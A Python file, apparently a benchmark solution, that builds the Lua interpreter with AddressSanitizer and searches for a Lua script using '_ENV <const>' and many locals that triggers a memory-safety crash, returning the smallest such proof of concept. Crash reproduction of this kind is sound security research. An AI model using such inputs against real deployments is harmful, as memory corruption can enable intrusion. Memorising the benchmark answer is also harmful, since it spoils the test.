import os
import re
import io
import tarfile
import tempfile
import subprocess
import shutil
from typing import List, Optional, Tuple


def _safe_extract_tar(tar_path: str, dst_dir: str) -> None:
    def is_within_directory(directory: str, target: str) -> bool:
        abs_directory = os.path.abspath(directory)
        abs_target = os.path.abspath(target)
        return os.path.commonpath([abs_directory]) == os.path.commonpath([abs_directory, abs_target])

    with tarfile.open(tar_path, "r:*") as tar:
        for member in tar.getmembers():
            member_path = os.path.join(dst_dir, member.name)
            if not is_within_directory(dst_dir, member_path):
                continue
            tar.extract(member, dst_dir)


def _find_lua_src_dir(extracted_root: str) -> Optional[str]:
    # Heuristic: directory containing several core Lua C files
    must_have = {"lparser.c", "llex.c", "lapi.c", "lvm.c"}
    best = None
    best_score = 0
    for dirpath, dirnames, filenames in os.walk(extracted_root):
        fnset = set(filenames)
        score = len(must_have & fnset)
        if score > best_score:
            best_score = score
            best = dirpath
            if best_score == len(must_have):
                # Prefer exact src dir if it also has headers
                if "lua.h" in fnset and "lauxlib.h" in fnset and "lualib.h" in fnset:
                    return best
    return best if best_score >= 2 else None


def _pick_compiler() -> str:
    for c in ("clang", "cc", "gcc"):
        p = shutil.which(c)
        if p:
            return p
    return "cc"


def _build_asan_harness(src_dir: str, out_dir: str) -> Optional[str]:
    cc = _pick_compiler()
    harness_c = r'''
#include "lua.h"
#include "lauxlib.h"
#include "lualib.h"
#include <stdio.h>
#include <stdlib.h>

static unsigned char* read_all_stdin(size_t* outlen) {
  size_t cap = 1 << 16;
  size_t n = 0;
  unsigned char* buf = (unsigned char*)malloc(cap);
  if (!buf) return NULL;
  for (;;) {
    size_t want = cap - n;
    size_t r = fread(buf + n, 1, want, stdin);
    n += r;
    if (r < want) {
      if (feof(stdin)) break;
      if (ferror(stdin)) { free(buf); return NULL; }
    }
    if (n == cap) {
      size_t ncap = cap * 2;
      unsigned char* nbuf = (unsigned char*)realloc(buf, ncap);
      if (!nbuf) { free(buf); return NULL; }
      buf = nbuf; cap = ncap;
    }
  }
  *outlen = n;
  return buf;
}

int main(void) {
  size_t len = 0;
  unsigned char* buf = read_all_stdin(&len);
  if (!buf) return 1;

  lua_State* L = luaL_newstate();
  if (!L) { free(buf); return 1; }
  luaL_openlibs(L);

  int status = luaL_loadbuffer(L, (const char*)buf, len, "poc");
  if (status == LUA_OK) status = lua_pcall(L, 0, 0, 0);

  lua_close(L);
  free(buf);
  return status == LUA_OK ? 0 : 1;
}
'''
    harness_path = os.path.join(out_dir, "poc_harness.c")
    with open(harness_path, "w", encoding="utf-8") as f:
        f.write(harness_c)

    c_files = []
    try:
        for name in os.listdir(src_dir):
            if not name.endswith(".c"):
                continue
            if name in ("lua.c", "luac.c", "ltests.c", "onelua.c", "minilua.c"):
                continue
            c_files.append(os.path.join(src_dir, name))
    except Exception:
        return None

    if not c_files:
        return None

    out_bin = os.path.join(out_dir, "poc_lua")

    cflags = [
        "-O0", "-g",
        "-fsanitize=address",
        "-fno-omit-frame-pointer",
        "-I", src_dir,
        "-DLUA_USE_LINUX",
        "-DLUA_USE_POSIX",
        "-DLUA_USE_DLOPEN",
        "-D_FORTIFY_SOURCE=0",
    ]
    ldflags = ["-fsanitize=address", "-ldl", "-lm"]

    cmd = [cc, harness_path] + c_files + cflags + ["-o", out_bin] + ldflags
    try:
        r = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=120)
    except Exception:
        return None
    if r.returncode != 0:
        return None
    if not (os.path.isfile(out_bin) and os.access(out_bin, os.X_OK)):
        return None
    return out_bin


def _run_and_is_asan_crash(exe: str, script: bytes) -> bool:
    env = os.environ.copy()
    env["ASAN_OPTIONS"] = "detect_leaks=0:halt_on_error=1:abort_on_error=1:exitcode=86"
    env["UBSAN_OPTIONS"] = "halt_on_error=1:abort_on_error=1:exitcode=86"
    try:
        p = subprocess.run(
            [exe],
            input=script,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.PIPE,
            env=env,
            timeout=3,
        )
    except subprocess.TimeoutExpired:
        return False
    except Exception:
        return False
    err = p.stderr.decode("utf-8", "replace")
    if "AddressSanitizer" in err:
        return True
    if "heap-use-after-free" in err:
        return True
    return False


def _var_list(prefix: str, n: int) -> str:
    return ",".join(f"{prefix}{i}" for i in range(n))


def _gen_script(nvars: int, nblocks: int, inner: bool, inner_env: bool, do_global_assign: bool) -> str:
    vl = _var_list("a", nvars)
    parts = []
    # Keep a space before '<const>' for max parser compatibility
    parts.append("local _ENV <const> = _G;")
    for _ in range(nblocks):
        parts.append(f"do local {vl} end;")
    if do_global_assign:
        parts.append("x=1;")
    if inner:
        inner_parts = []
        if inner_env:
            inner_parts.append("local _ENV <const> = _G;")
        inner_parts.append("print(1);")
        if do_global_assign:
            inner_parts.append("y=2;")
        parts.append("local function f()" + "".join(inner_parts) + "end;f();")
    parts.append("print(2);")
    return "".join(parts) + "\n"


def _fallback_poc() -> bytes:
    # Reasonably small, stresses local-variable bookkeeping without exceeding active local limit.
    s = _gen_script(nvars=140, nblocks=2, inner=True, inner_env=False, do_global_assign=True)
    return s.encode("utf-8", "strict")


def _collect_lua_candidates_from_tree(root: str, max_files: int = 200) -> List[bytes]:
    out = []
    cnt = 0
    for dirpath, dirnames, filenames in os.walk(root):
        for fn in filenames:
            if not fn.endswith(".lua"):
                continue
            p = os.path.join(dirpath, fn)
            try:
                st = os.stat(p)
                if st.st_size <= 0 or st.st_size > 20000:
                    continue
                with open(p, "rb") as f:
                    data = f.read()
                if b"_ENV" in data and b"const" in data and b"<" in data and b">" in data:
                    out.append(data)
                    cnt += 1
                    if cnt >= max_files:
                        return out
            except Exception:
                continue
    return out


class Solution:
    def solve(self, src_path: str) -> bytes:
        fallback = _fallback_poc()

        # Try to build an ASan harness and discover a crashing input automatically.
        try:
            with tempfile.TemporaryDirectory() as td:
                extracted = os.path.join(td, "src")
                os.mkdir(extracted)
                try:
                    _safe_extract_tar(src_path, extracted)
                except Exception:
                    return fallback

                src_dir = _find_lua_src_dir(extracted)
                if not src_dir:
                    return fallback

                build_dir = os.path.join(td, "build")
                os.mkdir(build_dir)
                exe = _build_asan_harness(src_dir, build_dir)
                if not exe:
                    return fallback

                # First, try any existing lua testcases mentioning _ENV <const>
                for cand in _collect_lua_candidates_from_tree(extracted):
                    if _run_and_is_asan_crash(exe, cand):
                        return cand

                # Systematic search over a few patterns.
                patterns: List[Tuple[bool, bool, bool]] = [
                    (False, False, False),
                    (False, False, True),
                    (True, False, False),
                    (True, False, True),
                    (True, True, False),
                    (True, True, True),
                ]

                best_script = None
                best_len = None

                for nblocks in (1, 2, 3):
                    for (inner, inner_env, do_assign) in patterns:
                        # Try increasing nvars until crash; then binary search down.
                        crashed_at = None
                        for nvars in range(5, 191, 5):
                            script = _gen_script(nvars, nblocks, inner, inner_env, do_assign)
                            sb = script.encode("utf-8", "strict")
                            if _run_and_is_asan_crash(exe, sb):
                                crashed_at = nvars
                                break
                        if crashed_at is None:
                            continue

                        lo, hi = 1, crashed_at
                        while lo < hi:
                            mid = (lo + hi) // 2
                            script = _gen_script(mid, nblocks, inner, inner_env, do_assign)
                            sb = script.encode("utf-8", "strict")
                            if _run_and_is_asan_crash(exe, sb):
                                hi = mid
                            else:
                                lo = mid + 1

                        final_script = _gen_script(lo, nblocks, inner, inner_env, do_assign).encode("utf-8", "strict")
                        L = len(final_script)
                        if best_len is None or L < best_len:
                            best_len = L
                            best_script = final_script

                if best_script is not None:
                    return best_script
        except Exception:
            pass

        return fallback